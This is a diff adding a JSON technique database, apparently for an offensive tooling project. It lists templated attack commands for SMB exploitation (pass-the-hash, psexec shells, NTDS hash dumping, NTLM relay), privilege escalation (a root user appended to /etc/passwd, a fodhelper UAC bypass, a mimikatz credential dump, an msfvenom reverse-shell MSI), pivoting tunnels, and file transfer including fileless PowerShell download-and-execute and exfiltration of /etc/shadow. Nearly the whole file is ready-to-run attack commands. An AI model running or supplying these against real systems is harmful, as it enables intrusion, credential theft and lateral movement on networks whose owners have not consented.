@@ -1,0 +1,72 @@
+[
+  {
+    "category": "SMB Attacks",
+    "techniques": [
+      {"id":"smb_1","name":"SMB Share Listing","purpose":"List all available SMB shares","when_to_use":"When SMB (445) is open","command":"smbclient -L //{TARGET_IP} -U '{USERNAME}%{PASSWORD}'","tags":["smb","enum"]},
+      {"id":"smb_2","name":"SMBMap Share Permissions","purpose":"Check read/write access on all shares","when_to_use":"After finding SMB shares","command":"smbmap -H {TARGET_IP} -u {USERNAME} -p {PASSWORD} -R","tags":["smb","smbmap"]},
+      {"id":"smb_3","name":"Connect to SMB Share","purpose":"Browse and download files from share","when_to_use":"When you have access to a share","command":"smbclient //{TARGET_IP}/share -U '{USERNAME}%{PASSWORD}'","tags":["smb","access"]},
+      {"id":"smb_4","name":"Download All Files from Share","purpose":"Recursively download share contents","when_to_use":"When you want to grab all files","command":"smbclient //{TARGET_IP}/share -U '{USERNAME}%{PASSWORD}' -c 'recurse ON; prompt OFF; mget *'","tags":["smb","download"]},
+      {"id":"smb_5","name":"CrackMapExec Full Enum","purpose":"Enumerate SMB info, users, shares, sessions","when_to_use":"Quick SMB recon with credentials","command":"crackmapexec smb {TARGET_IP} -u {USERNAME} -p {PASSWORD} --shares --users --sessions --loggedon-users","tags":["smb","cme"]},
+      {"id":"smb_6","name":"Pass-the-Hash via CME","purpose":"Authenticate using NTLM hash","when_to_use":"When you have NTLM hash but not plaintext password","command":"crackmapexec smb {TARGET_IP} -u {USERNAME} -H {PASSWORD} --shares","tags":["smb","pth","cme"]},
+      {"id":"smb_7","name":"PSExec Shell (Impacket)","purpose":"Get SYSTEM shell via SMB","when_to_use":"When you have admin credentials on Windows","command":"impacket-psexec {USERNAME}:{PASSWORD}@{TARGET_IP}","tags":["smb","psexec","shell"]},
+      {"id":"smb_8","name":"WMIExec Shell","purpose":"Execute commands via WMI (no service install)","when_to_use":"Stealthier alternative to PSExec","command":"impacket-wmiexec {USERNAME}:{PASSWORD}@{TARGET_IP}","tags":["smb","wmi","shell"]},
+      {"id":"smb_9","name":"SMBExec Shell","purpose":"Execute commands via SMB (no binary drop)","when_to_use":"When PSExec is blocked by AV","command":"impacket-smbexec {USERNAME}:{PASSWORD}@{TARGET_IP}","tags":["smb","shell","evasion"]},
+      {"id":"smb_10","name":"SecretsDump Remote","purpose":"Dump SAM/NTDS hashes remotely","when_to_use":"When you have admin access to Windows","command":"impacket-secretsdump {USERNAME}:{PASSWORD}@{TARGET_IP} -just-dc-ntlm","tags":["smb","hashes","impacket"]},
+      {"id":"smb_11","name":"Null Session Enumeration","purpose":"Enumerate SMB without credentials","when_to_use":"When SMB allows anonymous access","command":"enum4linux -a {TARGET_IP} 2>/dev/null | tee enum4linux.txt","tags":["smb","null","enum"]},
+      {"id":"smb_12","name":"Relay Attack (Responder + ntlmrelayx)","purpose":"Relay captured NTLM auth to another host","when_to_use":"When SMB signing is disabled on target","command":"impacket-ntlmrelayx -tf targets.txt -smb2support -c 'whoami'","tags":["smb","relay","ntlm"]}
+    ]
+  },
+  {
+    "category": "Privilege Escalation",
+    "techniques": [
+      {"id":"pe_1","name":"LinPEAS Full Enum","purpose":"Automated Linux privilege escalation checks","when_to_use":"After getting initial shell on Linux","command":"curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh 2>/dev/null | tee /tmp/lp_out.txt","tags":["privesc","linux","linpeas"]},
+      {"id":"pe_2","name":"WinPEAS Full Enum","purpose":"Automated Windows privilege escalation checks","when_to_use":"After getting initial shell on Windows","command":".\\.\\winPEASx64.exe log > winpeas_out.txt","tags":["privesc","windows","winpeas"]},
+      {"id":"pe_3","name":"Sudo -l Check","purpose":"List commands current user can run as sudo","when_to_use":"First check on any Linux shell","command":"sudo -l 2>/dev/null","tags":["privesc","linux","sudo"]},
+      {"id":"pe_4","name":"SUID Binary Search","purpose":"Find SUID binaries exploitable for privesc","when_to_use":"Linux privilege escalation","command":"find / -perm -4000 -type f 2>/dev/null | xargs ls -la","tags":["privesc","linux","suid"]},
+      {"id":"pe_5","name":"Writable Files by Root","purpose":"Find files owned by root but writable","when_to_use":"Linux privilege escalation","command":"find / -writable -user root -type f 2>/dev/null | grep -v proc","tags":["privesc","linux"]},
+      {"id":"pe_6","name":"Crontab Enumeration","purpose":"Find writable cron jobs for privesc","when_to_use":"Linux privilege escalation","command":"cat /etc/crontab; ls -la /etc/cron*; crontab -l 2>/dev/null","tags":["privesc","linux","cron"]},
+      {"id":"pe_7","name":"Capabilities Search","purpose":"Find binaries with dangerous capabilities","when_to_use":"Linux privilege escalation","command":"getcap -r / 2>/dev/null","tags":["privesc","linux","capabilities"]},
+      {"id":"pe_8","name":"Writable /etc/passwd","purpose":"Add root user if /etc/passwd is writable","when_to_use":"When /etc/passwd is world-writable","command":"echo 'hacker:$(openssl passwd -1 hacked):0:0:root:/root:/bin/bash' >> /etc/passwd && su hacker","tags":["privesc","linux"]},
+      {"id":"pe_9","name":"NFS No_root_squash Exploit","purpose":"Get root via NFS misconfiguration","when_to_use":"When NFS share has no_root_squash","command":"showmount -e {TARGET_IP} && mount -t nfs {TARGET_IP}:/share /mnt && cp /bin/bash /mnt/bash && chmod +s /mnt/bash && /mnt/bash -p","tags":["privesc","linux","nfs"]},
+      {"id":"pe_10","name":"Token Impersonation (PrintSpoofer)","purpose":"Impersonate SYSTEM via SeImpersonatePrivilege","when_to_use":"When running as service account on Windows","command":".\\PrintSpoofer64.exe -i -c cmd","tags":["privesc","windows","token"]},
+      {"id":"pe_11","name":"Token Impersonation (GodPotato)","purpose":"Escalate to SYSTEM via potato attack","when_to_use":"When SeImpersonatePrivilege is available","command":".\\GodPotato.exe -cmd 'cmd /c whoami'","tags":["privesc","windows","potato"]},
+      {"id":"pe_12","name":"UAC Bypass via fodhelper","purpose":"Bypass UAC to get elevated shell","when_to_use":"When running as admin but UAC is blocking","command":"REG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d 'cmd.exe' /f && REG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /t REG_SZ /d '' /f && fodhelper.exe","tags":["privesc","windows","uac"]},
+      {"id":"pe_13","name":"Mimikatz Credential Dump","purpose":"Dump plaintext passwords and hashes from memory","when_to_use":"After gaining SYSTEM/admin on Windows","command":"mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"lsadump::sam\" exit","tags":["privesc","windows","mimikatz"]},
+      {"id":"pe_14","name":"AlwaysInstallElevated Exploit","purpose":"Install MSI as SYSTEM","when_to_use":"When AlwaysInstallElevated registry keys are set","command":"reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated && msfvenom -p windows/x64/shell_reverse_tcp LHOST={TARGET_IP} LPORT=4444 -f msi -o shell.msi && msiexec /quiet /qn /i shell.msi","tags":["privesc","windows","msi"]}
+    ]
+  },
+  {
+    "category": "Pivoting",
+    "techniques": [
+      {"id":"piv_1","name":"Chisel Server (Attacker)","purpose":"Set up reverse SOCKS5 proxy server","when_to_use":"When pivoting into internal network","command":"./chisel server -p 8001 --reverse --socks5","tags":["pivot","chisel","socks"]},
+      {"id":"piv_2","name":"Chisel Client (Target)","purpose":"Connect back to chisel server for SOCKS5","when_to_use":"Run on compromised host","command":"./chisel client {TARGET_IP}:8001 R:socks","tags":["pivot","chisel","socks"]},
+      {"id":"piv_3","name":"Chisel Local Port Forward","purpose":"Forward specific port through chisel","when_to_use":"When you need one specific port forwarded","command":"./chisel client {TARGET_IP}:8001 R:3306:127.0.0.1:3306","tags":["pivot","chisel","portfwd"]},
+      {"id":"piv_4","name":"SSH SOCKS Proxy","purpose":"Create SOCKS5 proxy via SSH","when_to_use":"When you have SSH access to pivot host","command":"ssh -D 1080 -f -N {USERNAME}@{PIVOT_IP} && echo 'socks5 127.0.0.1 1080' >> /etc/proxychains4.conf","tags":["pivot","ssh","socks"]},
+      {"id":"piv_5","name":"SSH Local Port Forward","purpose":"Forward remote internal port to localhost","when_to_use":"To reach internal service via SSH pivot","command":"ssh -L 8080:{TARGET_IP}:80 {USERNAME}@{PIVOT_IP} -N -f","tags":["pivot","ssh","portfwd"]},
+      {"id":"piv_6","name":"Proxychains with Nmap","purpose":"Scan internal network through SOCKS proxy","when_to_use":"After setting up SOCKS proxy","command":"proxychains nmap -sT -Pn -p 22,80,443,445,3389 {PIVOT_IP}","tags":["pivot","proxychains","nmap"]},
+      {"id":"piv_7","name":"Ligolo-ng Proxy (Attacker)","purpose":"Fast TUN-based tunneling","when_to_use":"Advanced pivoting — faster than chisel","command":"./proxy -selfcert -laddr 0.0.0.0:11601","tags":["pivot","ligolo"]},
+      {"id":"piv_8","name":"Ligolo-ng Agent (Target)","purpose":"Connect agent to ligolo proxy","when_to_use":"Run on compromised host","command":"./agent -connect {TARGET_IP}:11601 -ignore-cert","tags":["pivot","ligolo"]},
+      {"id":"piv_9","name":"Socat Port Forward","purpose":"Forward port from pivot to internal host","when_to_use":"Simple port forwarding without SSH","command":"socat TCP-LISTEN:8080,fork TCP:{PIVOT_IP}:80 &","tags":["pivot","socat"]},
+      {"id":"piv_10","name":"netsh Port Forward (Windows)","purpose":"Forward port on Windows pivot host","when_to_use":"When pivot is a Windows machine","command":"netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress={PIVOT_IP}","tags":["pivot","windows","netsh"]}
+    ]
+  },
+  {
+    "category": "File Transfer",
+    "techniques": [
+      {"id":"ft_1","name":"Python HTTP Server","purpose":"Serve files from attacker machine","when_to_use":"When transferring files to target","command":"python3 -m http.server 8080","tags":["transfer","python","http"]},
+      {"id":"ft_2","name":"wget Download","purpose":"Download file from HTTP server","when_to_use":"On Linux target","command":"wget http://{TARGET_IP}:8080/file.sh -O /tmp/file.sh && chmod +x /tmp/file.sh","tags":["transfer","wget","linux"]},
+      {"id":"ft_3","name":"curl Download","purpose":"Download file silently","when_to_use":"On Linux target","command":"curl -s http://{TARGET_IP}:8080/file.sh -o /tmp/file.sh && chmod +x /tmp/file.sh","tags":["transfer","curl","linux"]},
+      {"id":"ft_4","name":"SCP Upload to Target","purpose":"Upload file to remote host via SSH","when_to_use":"When SSH is available","command":"scp /local/file.txt {USERNAME}@{TARGET_IP}:/tmp/file.txt","tags":["transfer","scp","ssh"]},
+      {"id":"ft_5","name":"SCP Download from Target","purpose":"Download file from remote host","when_to_use":"When exfiltrating files","command":"scp {USERNAME}@{TARGET_IP}:/etc/shadow /tmp/shadow","tags":["transfer","scp","ssh"]},
+      {"id":"ft_6","name":"SCP Recursive Directory","purpose":"Transfer entire directory","when_to_use":"When transferring multiple files","command":"scp -r {USERNAME}@{TARGET_IP}:/var/www/html /tmp/webroot","tags":["transfer","scp","ssh"]},
+      {"id":"ft_7","name":"PowerShell WebClient Download","purpose":"Download file on Windows","when_to_use":"On Windows target","command":"powershell -c \"(New-Object Net.WebClient).DownloadFile('http://{TARGET_IP}:8080/file.exe','C:\\Windows\\Temp\\file.exe')\"","tags":["transfer","powershell","windows"]},
+      {"id":"ft_8","name":"PowerShell IEX (Fileless)","purpose":"Execute script in memory without writing to disk","when_to_use":"When AV is blocking file writes","command":"powershell -nop -exec bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://{TARGET_IP}:8080/script.ps1')\"","tags":["transfer","powershell","fileless"]},
+      {"id":"ft_9","name":"Certutil Download (Windows)","purpose":"Download file using certutil","when_to_use":"When PowerShell is restricted","command":"certutil -urlcache -split -f http://{TARGET_IP}:8080/file.exe C:\\Windows\\Temp\\file.exe","tags":["transfer","certutil","windows"]},
+      {"id":"ft_10","name":"Impacket SMB Server","purpose":"Host files over SMB for Windows targets","when_to_use":"When transferring to Windows without HTTP","command":"impacket-smbserver share . -smb2support -username {USERNAME} -password {PASSWORD}","tags":["transfer","smb","windows"]},
+      {"id":"ft_11","name":"Base64 Encode Transfer","purpose":"Transfer files through shell as base64 text","when_to_use":"When no HTTP/SMB/SCP available","command":"base64 -w 0 /tmp/file.sh && echo 'PASTE_BASE64_HERE' | base64 -d > /tmp/file.sh","tags":["transfer","base64"]},
+      {"id":"ft_12","name":"Netcat File Transfer","purpose":"Transfer file using netcat","when_to_use":"When only netcat is available","command":"nc -lvnp 4444 > received_file  # receiver\nnc {TARGET_IP} 4444 < file_to_send  # sender","tags":["transfer","netcat"]},
+      {"id":"ft_13","name":"SFTP Interactive Transfer","purpose":"Browse and transfer files interactively","when_to_use":"When SSH is available and you need to navigate","command":"sftp {USERNAME}@{TARGET_IP}","tags":["transfer","sftp","ssh"]},
+      {"id":"ft_14","name":"Wget via Proxy","purpose":"Download through a proxy","when_to_use":"When direct connection is blocked","command":"wget -e use_proxy=yes -e http_proxy=127.0.0.1:8080 http://{TARGET_IP}:8080/file.sh -O /tmp/file.sh","tags":["transfer","wget","proxy"]}
+    ]
+  }
+]
